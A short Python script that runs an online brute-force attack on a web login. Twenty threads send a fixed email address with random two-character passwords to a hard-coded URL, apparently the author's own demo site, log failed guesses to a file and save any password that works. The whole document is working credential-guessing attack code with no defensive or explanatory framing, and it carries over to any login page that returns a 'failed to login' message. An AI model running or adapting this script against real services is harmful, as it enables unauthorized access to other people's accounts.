import requests
import random
from threading import Thread
import os

url = "https://bruteforceexample-53291.web.app"
email = 'bruteforceexample1@gmail.com'

def send_request(email, password):
    data = {
        "email" : email,
        "password" : password
    }

    r = requests.get(url, data=data)
    return r


chars = "abcdefghijklmnopqrstuvwxyz0123456789"

def main():
    while True:
        if "correctone.txt" in os.listdir():
            break
        valid = False
        while not valid:
            rndpasswd = random.choices(chars, k=2)
            passwd = "".join(rndpasswd)
            file = open("passwords.txt", 'r')
            tries = file.read()
            file.close()
            if passwd in tries:
                pass
            else:
                valid = True
            
        r = send_request(email, passwd)

        if 'failed to login' in r.text.lower():
            with open("passwords.txt", "a") as f:
                f.write(f"{passwd}\n")
                f.close()
            print(f"Incorrect {passwd}\n")
        else:
            print(f"Correct Password {passwd}!\n")
            with open("correctone.txt", "w") as f:
                f.write(passwd)
            break


for x in range(20):
    Thread(target=main).start()